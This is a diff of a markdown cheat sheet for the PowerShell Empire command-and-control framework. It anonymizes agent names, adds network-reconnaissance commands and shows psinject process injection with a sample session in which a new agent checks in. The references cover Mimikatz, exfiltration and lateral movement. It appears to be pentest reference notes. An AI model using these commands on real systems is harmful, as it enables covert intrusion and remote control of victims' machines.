@@ -5,8 +5,8 @@ Search Tag(s): #empire #command-and-control #interactive-shell #help-menu
 ## 01 - Help Menu
 
 ```
-(Empire: agents) > interact WindowsWS01
-(Empire: WindowsWS01) > help
+(Empire: agents) > interact <AGENT_NAME>
+(Empire: AGENT_NAME) > help
 
 ┌Help Options────┬─────────────────────────────────────┬───────────────────────────────┐
 │ Name           │ Description                         │ Usage                         │
@@ -114,43 +114,49 @@ Search Tag(s): #empire #command-and-control #interactive-shell #help-menu
 
 ## 02 - Usage
 
+`(Empire: AGENT_NAME) > ipconfig`
+
+`(Empire: AGENT_NAME) > powershell_situational_awareness_network_arpscan`
+
 ### 2.1 - Process Manipulation
 
-`(Empire: WinWS01Admin) > psinject <listener> <pid>`
+- Syntax
+
+`(Empire: AGENT_NAME) > psinject <listener> <pid>`
 
 ```
-(Empire: WinWS01Admin) > psinject http_80 460
+(Empire: AGENT_NAME) > psinject http 460
 [*] Tasked admin to run Task 3
 [+] New agent F38APL75 checked in
 [*] Sending agent (stage 2) to F38APL75 at 10.0.2.4
-(Empire: WinWS01Admin) > interact F38APL75
+(Empire: AGENT_NAME) > interact F38APL75
 ```
 
 ---
 ## References
 
-* [Beginning Powershell Empire Attack](https://www.securitynik.com/2022/02/beginning-powershell-empire-attack-in.html)
+* [SecurityNik: Beginning Powershell Empire Attack](https://www.securitynik.com/2022/02/beginning-powershell-empire-attack-in.html)
 
-* [HackMag Powershell Empire Modules](https://hackmag.com/security/powershell-empire/)
+* [HackMag: Powershell Empire Modules](https://hackmag.com/security/powershell-empire/)
 
-* [Empire For Pentester Active Directory Enumeration](https://www.hackingarticles.in/empire-for-pentester-active-directory-enumeration/)
+* [Hacking Articles: Empire For Pentester Active Directory Enumeration](https://www.hackingarticles.in/empire-for-pentester-active-directory-enumeration/)
 
-* [Powershell Empire For Pentester Mimikatz Module](https://www.hackingarticles.in/powershell-empire-for-pentester-mimikatz-module/)
+* [Hacking Articles: Powershell Empire For Pentester Mimikatz Module](https://www.hackingarticles.in/powershell-empire-for-pentester-mimikatz-module/)
 
-* [OSX Exploitation with Powershell Empire](https://www.hackingarticles.in/osx-exploitation-with-powershell-empire/)
+* [Hacking Articles: OSX Exploitation with Powershell Empire](https://www.hackingarticles.in/osx-exploitation-with-powershell-empire/)
 
-* [Hacking with Empire Powershell Post Exploitation Agent](https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/)
+* [Hacking Articles: Hacking with Empire Powershell Post Exploitation Agent](https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/)
 
-* [Data Exfiltration Using Powershell Empire/](https://www.hackingarticles.in/data-exfiltration-using-powershell-empire/)
+* [Hacking Articles: Data Exfiltration Using Powershell Empire](https://www.hackingarticles.in/data-exfiltration-using-powershell-empire/)
 
-* [Part 2 Intro to Threat Hunting Understanding the Attacker Mindset with Powershell Empire and the Mandiant Attack Lifecycle](https://holdmybeersecurity.com/2020/01/23/part-2-intro-to-threat-hunting-understanding-the-attacker-mindset-with-powershell-empire-and-the-mandiant-attack-lifecycle/)
+* [HoldMyBeer: Part 2 Intro to Threat Hunting Understanding the Attacker Mindset with Powershell Empire and the Mandiant Attack Lifecycle](https://holdmybeersecurity.com/2020/01/23/part-2-intro-to-threat-hunting-understanding-the-attacker-mindset-with-powershell-empire-and-the-mandiant-attack-lifecycle/)
 
-* [Command and Control with Powershell Empire part 1](https://www.snaplabs.io/insights/command-and-control-with-powershell-empire-pt1)
+* [SnapLabs: Command and Control with Powershell Empire part 1](https://www.snaplabs.io/insights/command-and-control-with-powershell-empire-pt1)
 
-* [Command and Control with Powershell Empire part 2](https://www.snaplabs.io/insights/command-and-control-with-powershell-empire-pt2)
+* [SnapLabs: Command and Control with Powershell Empire part 2](https://www.snaplabs.io/insights/command-and-control-with-powershell-empire-pt2)
 
-* [Command and Control with Powershell Empire part 3](https://www.snaplabs.io/insights/command-and-control-with-powershell-empire-pt3)
+* [SnapLabs: Command and Control with Powershell Empire part 3](https://www.snaplabs.io/insights/command-and-control-with-powershell-empire-pt3)
 
-* [Lateral Movement Methods and Good Practices](https://www.snaplabs.io/insights/lateral-movement-methods-and-good-practices)
+* [SnapLabs: Lateral Movement Methods and Good Practices](https://www.snaplabs.io/insights/lateral-movement-methods-and-good-practices)
 
 * [Empire Module Library](https://www.infosecmatter.com/empire-module-library/)
